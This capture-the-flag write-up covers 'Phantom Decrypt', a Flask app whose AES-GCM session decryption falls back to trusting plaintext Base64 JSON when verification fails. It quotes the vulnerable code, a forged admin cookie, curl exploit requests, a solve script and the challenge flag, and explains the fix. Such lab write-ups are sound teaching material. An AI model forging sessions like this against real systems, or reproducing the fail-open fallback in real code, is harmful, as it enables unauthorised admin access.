# Phantom Decrypt

## Metadata

| Field | Value |
| --- | --- |
| Category | `cryptography` |
| Difficulty | Medium |
| Points | 100 |
| Solves | 133 |
| First Blood | jbr3abyt3 |

## Challenge Description

```text
SecureVault guards its sessions with AES-GCM. The recovery key lives in the
admin dashboard, where only admins can see it. Naturally.
```

## Artifacts

The provided archive contained a single Flask application:

```text
public.zip
extracted/app.py
solve_phantom.sh
```

The archive password from the challenge notes was:

```text
infected
```

Target used during the solve:

```text
https://a3588f2a685c1d0b.chal.ctf.ae
```

## Recon

I started from the provided source instead of trying to attack AES-GCM directly.
The archive contained only `app.py`:

```bash
7z l -pinfected public.zip
```

Relevant output:

```text
Listing archive: public.zip
Name
------------------------
app.py
```

The application exposed a small route map:

```text
GET       /
GET       /health
GET,POST  /login
GET       /dashboard
```

The login page itself also gave a normal low-privilege account:

```html
<p>Guest access: guest / guest123</p>
```

So the first reasonable test was the normal authentication flow, not cookie
forgery. Posting the guest credentials returned a `session_token` cookie:

```bash
curl -k -i -X POST \
  https://a3588f2a685c1d0b.chal.ctf.ae/login \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'username=guest&password=guest123'
```

Representative response header:

```text
HTTP/1.1 302 FOUND
Location: /dashboard
Set-Cookie: session_token=<base64 blob>; HttpOnly; Path=/; SameSite=Lax
```

The source shows how that legitimate cookie is produced. On successful login,
the app serializes `user`, `role`, and `iat`, then encrypts the JSON with
AES-GCM:

```python
session_data = {
    "user": username,
    "role": USERS[username]["role"],
    "iat": int(time.time()),
}
token = encrypt_session(session_data)
```

The only configured user is `guest`, and its role is `viewer`:

```python
USERS = {
    "guest": {"password": "guest123", "role": "viewer"},
}
```

The dashboard then trusts the decoded session role:

```python
user = session_data.get("user", "unknown")
role = session_data.get("role", "viewer")

if role == "admin":
    flag_section = f"<p><b>Admin Recovery Key:</b> {FLAG}</p>"
```

At this point the important question became: is every accepted session really an
authenticated AES-GCM session, or is there another parser path?

## Vulnerability

The bug is in `decrypt_session()`:

```python
def decrypt_session(cookie: str) -> dict:
    try:
        raw = base64.b64decode(cookie)
        nonce = raw[:12]
        tag = raw[12:28]
        ciphertext = raw[28:]
        cipher = AES.new(SECRET_KEY, AES.MODE_GCM, nonce=nonce)
        plaintext = cipher.decrypt_and_verify(ciphertext, tag)
        return json.loads(plaintext)
    except Exception:
        session_data = json.loads(base64.b64decode(cookie))
        return session_data
```

The suspicious artifact is not AES-GCM itself. AES-GCM is the safe path here
because `decrypt_and_verify()` rejects tampered ciphertext when the tag is
invalid. PyCryptodome documents that `decrypt_and_verify()` raises `ValueError`
when the MAC tag is invalid and the message should not be trusted.

The vulnerable idea came from the broad `except Exception`. If AES-GCM parsing,
decryption, or tag verification fails for any reason, the application does not
reject the cookie. Instead, it Base64-decodes the same cookie again and parses it
as plaintext JSON.

That turns a supposedly authenticated encrypted session into this fallback:

```text
session_token = base64(JSON session object)
```

No key, nonce, ciphertext, or GCM tag is needed for the fallback path. The server
only requires the decoded JSON to contain a role field:

```json
{"user":"guest","role":"admin","iat":0}
```

This is an authentication/session integrity flaw: the server accepts
attacker-controlled session state after the authenticated decrypt path fails.

## Exploitation

The exploit chain was:

1. Read the route map and identify `/login` and `/dashboard` as the session flow.
2. Confirm that the normal guest account receives an encrypted `session_token`.
3. Read `decrypt_session()` and notice the fallback after AES-GCM failure.
4. Base64-encode a JSON session with `role` set to `admin`.
5. Send that value as the `session_token` cookie.
6. Let AES-GCM verification fail, triggering the fallback JSON parser.
7. Reach `/dashboard` with `role == "admin"` and read the recovery key.

The forged plaintext JSON was:

```json
{"user":"guest","role":"admin","iat":0}
```

Base64 encoding it produced:

```text
eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjB9
```

The final request was:

```bash
curl -k \
  -b 'session_token=eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjB9' \
  https://a3588f2a685c1d0b.chal.ctf.ae/dashboard
```

Relevant response fragment:

```html
<span class="badge badge-admin">admin</span>
...
<div class="flag-value">flag{8c448d706c5bdeca}</div>
```

As a control, the same plaintext fallback with `role` set to `viewer` did not
show the flag:

```bash
curl -k \
  -b 'session_token=eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidmlld2VyIiwiaWF0IjowfQ==' \
  https://a3588f2a685c1d0b.chal.ctf.ae/dashboard
```

Representative response:

```text
Admin privileges required
```

That control was useful because it showed the exploit was specifically the
server trusting the forged `role` value, not the dashboard leaking the flag to
all authenticated users.

## Technical Details

The encrypted session format is:

```text
base64(nonce || tag || ciphertext)
```

where:

```python
nonce = get_random_bytes(12)
cipher = AES.new(SECRET_KEY, AES.MODE_GCM, nonce=nonce)
ciphertext, tag = cipher.encrypt_and_digest(plaintext)
blob = nonce + tag + ciphertext
```

If a cookie follows that format and the GCM tag is valid, `decrypt_session()`
returns the decrypted JSON. That path is fine.

The problem is error handling. A forged plaintext JSON cookie is still valid
Base64, but it is not a valid `nonce || tag || ciphertext` AES-GCM blob. The
first parser path fails. Because the exception handler is broad and permissive,
the same bytes are then interpreted as trusted JSON session data:

```text
base64(JSON) -> AES-GCM verification fails -> except block -> json.loads(...)
```

That means authentication integrity depends on an unauthenticated fallback
format. A correct implementation should reject the cookie immediately if
`decrypt_and_verify()` fails. It should not have a plaintext compatibility parser
for security-sensitive session tokens, and it should not trust client-supplied
authorization fields such as `role`.

## Exploit Artifact

The final artifact is [solve_phantom.sh](solve_phantom.sh). It generates the
Base64 JSON admin session and requests `/dashboard` with that value as the
`session_token` cookie.

Usage:

```bash
chmod +x solve_phantom.sh
./solve_phantom.sh https://a3588f2a685c1d0b.chal.ctf.ae
```

The script prints the extracted flag when the exploit succeeds.

## Validation

Health check:

```text
HTTP/1.1 200 OK
ok
```

Normal unauthenticated dashboard request:

```text
HTTP/1.1 302 FOUND
Location: /login
```

Viewer fallback control:

```text
Admin privileges required
```

Admin fallback exploit:

```text
flag{8c448d706c5bdeca}
```

## References

- <https://pycryptodome.readthedocs.io/en/latest/src/cipher/modern.html>
- <https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication>

## Flag

```text
flag{8c448d706c5bdeca}
```
